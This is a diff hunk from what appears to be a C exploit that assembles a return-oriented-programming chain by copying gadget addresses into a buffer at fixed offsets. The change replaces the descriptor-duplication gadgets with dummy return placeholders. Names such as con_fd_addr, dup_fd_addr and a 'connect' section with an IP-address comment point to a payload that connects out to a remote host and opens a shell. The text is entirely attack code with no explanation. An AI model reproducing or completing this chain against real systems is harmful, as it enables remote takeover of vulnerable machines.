@@ -128,15 +128,15 @@ int main(void)
   strcpy(bufr + 243, pop_edx);
   strcpy(bufr + 247, con_fd_addr);
   strcpy(bufr + 251, write_at_edx_from_eax);
-  strcpy(bufr + 255, pop_edx);
-  strcpy(bufr + 259, dup_fd_addr1);
-  strcpy(bufr + 263, write_at_edx_from_eax);
-  strcpy(bufr + 267, pop_edx);
-  strcpy(bufr + 271, dup_fd_addr2);
-  strcpy(bufr + 275, write_at_edx_from_eax);
-  strcpy(bufr + 279, pop_edx);
-  strcpy(bufr + 283, dup_fd_addr3);
-  strcpy(bufr + 287, write_at_edx_from_eax);
+  strcpy(bufr + 255, dummy_ret); // pop_edx
+  strcpy(bufr + 259, dummy_ret); // dup_fd_addr1
+  strcpy(bufr + 263, dummy_ret); // write_at_edx_from_eax
+  strcpy(bufr + 267, dummy_ret); // pop_edx
+  strcpy(bufr + 271, dummy_ret); // dup_fd_addr2
+  strcpy(bufr + 275, dummy_ret); // write_at_edx_from_eax
+  strcpy(bufr + 279, dummy_ret); // pop_edx
+  strcpy(bufr + 283, dummy_ret); // dup_fd_addr3
+  strcpy(bufr + 287, dummy_ret); // write_at_edx_from_eax
   //----------------------------------------------------------------------------------------- connect
   // pop ip_address without null chars into edx
   strcpy(bufr + 291, pop_edx); // 0xbbb9dc1b
